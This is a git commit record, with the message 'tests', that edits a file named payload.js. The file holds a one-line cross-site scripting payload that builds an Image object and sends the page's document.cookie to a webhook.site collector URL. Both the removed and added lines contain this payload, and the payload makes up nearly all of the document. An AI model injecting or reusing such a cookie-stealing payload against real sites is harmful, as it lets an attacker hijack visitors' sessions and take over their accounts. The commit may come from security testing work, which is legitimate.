acfd8f947486c8bd053e46debc6c040c83c64744
Reda Baydoun <reda.baydoun@gmail.com>
2022-12-28 18:15:56 -0500

    tests

--- payload.js
+++ payload.js
@@ -1,2 +1,2 @@
-var i = new Image;
-i.src="https://webhook.site/fd308601-f7c8-4a43-b823-752698e9a534/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/fd308601-f7c8-4a43-b823-752698e9a534/?cookie="+document.cookie;
+
